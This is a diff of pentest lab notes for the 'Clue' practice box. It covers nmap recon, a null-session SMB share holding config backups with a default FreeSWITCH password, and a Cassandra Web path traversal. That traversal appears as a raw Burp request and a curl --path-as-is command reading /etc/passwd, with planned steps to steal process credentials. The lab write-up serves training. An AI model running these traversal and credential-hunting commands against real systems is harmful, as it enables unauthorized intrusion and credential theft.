@@ -1,60 +1,115 @@
-My IP:  192.168.45.166
-Target IP: 192.168.201.240
+# Clue — PG Practice
 
-nmap:
+> **Note:** the box IP changes on each redeploy. Captured outputs below show different IPs from different sessions — set `IP` at the start of a session and use it:
+> ```bash
+> export IP=192.168.102.240
+> ```
+
+- **My IP:** 192.168.45.166
+- **Target IP:** 192.168.102.240 (changes per deploy)
+
+---
+
+## Recon — nmap
+
+```bash
+nmap -sC -sV -p- $IP -oN scans/nmap-full.txt
+```
+
 ```
 PORT     STATE SERVICE          VERSION
 22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
-|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
-|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
-80/tcp   open  http             Apache httpd 2.4.38
-|_http-title: 403 Forbidden
-|_http-server-header: Apache/2.4.38 (Debian)
+80/tcp   open  http             Apache httpd 2.4.38   # 403 Forbidden
 139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
-3000/tcp open  http             Thin httpd
-|_http-title: Cassandra Web
-|_http-server-header: thin
+3000/tcp open  http             Thin httpd            # title: Cassandra Web
 8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
-Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.9.5-Debian)
-|   Computer name: clue
-|   NetBIOS computer name: CLUE\x00
-|   Domain name: pg
-|   FQDN: clue.pg
-|_  System time: 2026-06-23T20:04:31-04:00
-| smb2-time: 
-|   date: 2026-06-24T00:04:27
-|_  start_date: N/A
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
-
+Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux
 ```
 
-Port 22: Can be good if we have creds or the ability to drop our key into an authorized key folder. Also good to transfer data to and from.
+### Port triage
+- **22 (SSH)** — useful with creds, or if we can drop a key into an `authorized_keys`. Also handy for file transfer.
+- **80 (HTTP)** — 403 Forbidden splash. Backup directory referenced but not accessible from the front end.
+- **139/445 (SMB)** — check for readable shares (the "backup web directory" hint lines up with port 80).
+- **3000 (HTTP / Cassandra Web)** — version **3.11.13**, served by `thin`. Visitable in browser.
+- **8021 (FreeSWITCH mod_event_socket)** — service product, likely needs the ESL password.
 
-port 139/445: SMB can be good to see if we have access to shares. We can try anonymous first then if we get any user creds we can use this service to login as them to enumerate some more. 
--  Server doesn't allow session using username '', password ''.
+---
 
-Port 3000: HTTP, try to visit
-	- Able to vist via web 
-	- Cassandra Web (potential type of web page) Version 3.11.13
+## SMB (139/445) — null session → readable backup share
 
-Port 8021: Could be a port servicing a product. "freeswitch-event FreeSWITCH mod_event_socket"
+```bash
+smbclient -L //$IP/ -N
+nxc smb $IP -u '' -p '' --shares
+```
 
-~~port 80: Web page~~ 
-- Enumeration on the front and back end.
-	-  Forbidden splash page when reaching port 80
-	- Backup Directory (there but not accessible)
+```
+Share      Permissions   Remark
+-----      -----------   ------
+print$                   Printer Drivers
+backup     READ          Backup web directory shares
+IPC$                     IPC Service (Samba 4.9.5-Debian)
+```
+
+→ **`backup` is READ as a null session** — this is the "backup web directory" hinted at on port 80. Mount it so `grep`/`find` work across the whole tree (see [[SMB]]):
+
+```bash
+sudo mount -t cifs //$IP/backup /mnt -o guest      # -o guest for null session
+grep -Ri password /mnt
+```
+
+→ The share is a **backup of the service config tree** (FreeSWITCH + Cassandra). Hunting for creds turns up:
+- `event_socket.conf.xml` → `<param name="password" value="ClueCon"/>` — this is the FreeSWITCH **default** ESL password.
+- `cassandra.yaml` → `keystore_password: cassandra` — TLS keystore pw, **not** a login.
+- A lot of noise under `doc/` and `lang/` (Cassandra CQL docs with `alice`/`bob` example passwords — red herrings).
+
+> **Backup ≠ live config.** `ClueCon` is the default — the running FreeSWITCH may use a different ESL password. Note it but don't trust it yet.
+
+---
+
+## Port 3000 — Cassandra Web 3.11.13
+
+- Loads in the browser. "Execute CQL" button errors out → dead end there.
+- Version **3.11.13** → research for known vulns. Cassandra-web 0.5.0 has a **directory / path traversal** issue.
+
+---
+
+## LFI / Path Traversal — discovered via Burp
+
+Tested traversal in the raw request path. **Browser collapses `../` before sending** (dot-segment normalization), so it has to be done in Burp Repeater (or `curl --path-as-is`) which send the path raw. See [[LFI_RFI]].
+
+**Burp Repeater — edit the request line:**
+```
+GET /../../../../../../etc/passwd HTTP/1.1
+Host: 192.168.102.240:3000
+```
+→ **200 OK**, `Content-Type: application/octet-stream` — returns `/etc/passwd`:
+```
+root:x:0:0:root:/root:/bin/bash
+...
+```
+
+**curl equivalent:**
+```bash
+curl -s --path-as-is "http://$IP:3000/../../../../etc/passwd" -o loot/passwd
+```
+→ `--path-as-is` stops curl collapsing the `../` — required or the payload never reaches the server.
+
+---
+
+## >>> CONTINUE HERE
+
+Next steps to work:
+- [ ] Carve real login users out of `loot/passwd` → `users.txt` (`grep -vE 'nologin|false' loot/passwd | cut -d: -f1`)
+- [ ] Read `/proc/self/cmdline` through the LFI to steal the running process's creds
+- [ ] Pull the **live** FreeSWITCH config (not the backup) to get the real ESL password
+
+---
+
+## Related Notes
+
+- [[Clue-CassandraWeb-LFI-to-Root]]   ← full attack-chain writeup
+- [[SMB]]
+- [[LFI_RFI]]
+- [[Curl]]
+- [[SSH]]
